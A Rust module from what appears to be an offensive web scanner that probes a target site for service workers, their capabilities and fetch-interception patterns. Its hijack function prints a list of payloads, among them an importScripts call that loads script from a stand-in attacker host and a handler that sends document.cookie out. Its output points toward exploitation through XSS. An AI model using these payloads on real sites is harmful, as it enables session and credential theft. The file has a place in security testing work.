use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn register(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Service Worker Registration Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let sw_paths = ["/sw.js", "/service-worker.js", "/serviceworker.js", "/worker.js", "/sw.js", "/static/sw.js", "/assets/sw.js"];

    let mut found = Vec::new();
    for path in &sw_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(resp) if resp.status().as_u16() == 200 => {
                let body = resp.text().await.unwrap_or_default();
                let has_sw = body.contains("serviceWorker") || body.contains("addEventListener('install'") || body.contains("addEventListener('fetch'") || body.contains("caches.open");
                let tag = if has_sw { "SW FILE".red().bold().to_string() } else { "JS file".to_string() };
                println!("  {} {:30} {} ({} bytes)", "*".cyan(), path, tag, body.len());
                found.push(path.to_string());
            }
            Ok(resp) => { println!("  {} {:30} {}", "*".dimmed(), path, resp.status()); }
            Err(_) => { println!("  {} {:30} error", "*".red(), path); }
        }
    }

    let resp = client.get(url).send().await?;
    let body = resp.text().await?;
    let has_register = body.contains("serviceWorker.register") || body.contains("navigator.serviceWorker.register");
    if has_register {
        println!("\n  {} Service worker registration detected in page.", "[!]".red().bold());
    }

    if !found.is_empty() {
        println!("\n{} {} service worker file(s) found. Check for XSS to inject.", "[!]".red().bold(), found.len());
    } else {
        println!("\n{} No service workers found.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn hijack(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Service Worker Hijacking", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let body = resp.text().await?;

    let vectors = [
        ("importScripts injection", "importScripts('https://attacker.com/evil.js')"),
        ("Cache poisoning", "caches.open('v1').put(request, maliciousResponse)"),
        ("Fetch interception", "self.addEventListener('fetch', e => e.respondWith(attackerResponse))"),
        ("Push hijacking", "self.addEventListener('push', e => showAttackerNotification())"),
        ("Message channel abuse", "self.addEventListener('message', e => e.ports[0].postMessage(document.cookie))"),
        ("Sync abuse", "self.addEventListener('sync', e => exfiltrateData())"),
    ];

    let has_import = body.contains("importScripts");
    let has_fetch = body.contains("addEventListener('fetch'") || body.contains("addEventListener(\"fetch\"");
    let has_cache = body.contains("caches.open");

    println!("  {} SW capabilities detected:", "[*]".cyan().bold());
    println!("    {} importScripts: {}", "*".cyan(), if has_import { "YES".red().to_string() } else { "no".to_string() });
    println!("    {} fetch handler: {}", "*".cyan(), if has_fetch { "YES".red().to_string() } else { "no".to_string() });
    println!("    {} cache API:    {}", "*".cyan(), if has_cache { "YES".red().to_string() } else { "no".to_string() });

    println!("\n  {} Hijack payloads:", "[*]".cyan().bold());
    for (name, payload) in &vectors {
        println!("    {} {:30} {}", "*".cyan(), name, payload);
    }

    if has_import {
        println!("\n{} importScripts detected — inject via XSS to load attacker script.", "[!]".red().bold());
    }
    Ok(())
}

pub async fn persist(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Service Worker Persistence Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let headers = resp.headers().clone();
    let body = resp.text().await?;

    let sw_header = headers.get("service-worker-allowed").and_then(|v| v.to_str().ok()).unwrap_or("/");
    println!("  {} Service-Worker-Allowed: {}", "*".cyan(), sw_header);

    let has_scope = body.contains("scope:") || body.contains("register(");
    let has_update = body.contains("update()") || body.contains("onupdatefound");
    let has_unreg = body.contains("unregister");

    println!("  {} Registration scope: {}", "*".cyan(), if has_scope { "present" } else { "absent" });
    println!("  {} Update mechanism:    {}", "*".cyan(), if has_update { "present" } else { "absent" });
    println!("  {} Unregister:          {}", "*".cyan(), if has_unreg { "available" } else { "not available" });

    let persistence_vectors = [
        ("Survives page reload", "SW persists across navigation and reload"),
        ("Survives cache clear", "SW registration survives browser cache clear"),
        ("Push persistence", "Push subscription keeps SW alive"),
        ("Periodic sync", "Periodic background sync keeps SW active"),
        ("Offline cache", "Pre-cached resources served by SW offline"),
    ];

    println!("\n  {} Persistence vectors:", "[*]".cyan().bold());
    for (name, desc) in &persistence_vectors {
        println!("    {} {:25} — {}", "*".cyan(), name, desc);
    }

    if sw_header == "/" {
        println!("\n{} SW scope is root '/' — attacker SW can control entire origin.", "[!]".red().bold());
    }
    Ok(())
}

pub async fn fetch(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Service Worker Fetch Interception", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let body = resp.text().await?;

    let fetch_patterns = [
        ("respondWith", "Intercepts and replaces response"),
        ("FetchEvent", "Listens to fetch events"),
        ("request.clone", "Clones request for inspection"),
        ("Cache.match", "Serves from cache"),
        ("Cache.put", "Stores in cache"),
        ("Response.redirect", "Can redirect responses"),
        ("new Response()", "Can craft custom responses"),
        ("e.request.url", "Accesses request URL"),
        ("e.request.headers", "Accesses request headers"),
        ("e.request.body", "Accesses request body"),
    ];

    let mut found = Vec::new();
    for (pattern, desc) in &fetch_patterns {
        if body.contains(pattern) {
            println!("  {} {:25} — {}", "[!]".red().bold(), pattern, desc);
            found.push(pattern.to_string());
        }
    }

    if found.is_empty() {
        println!("  {} No fetch interception patterns found.", "[-]".green().bold());
    } else {
        println!("\n{} {} fetch interception pattern(s) — credential theft possible.", "[!]".red().bold(), found.len());
        println!("  {} Attacker SW can intercept: auth tokens, cookies, POST bodies, API keys.", "[*]".cyan().bold());
    }
    Ok(())
}
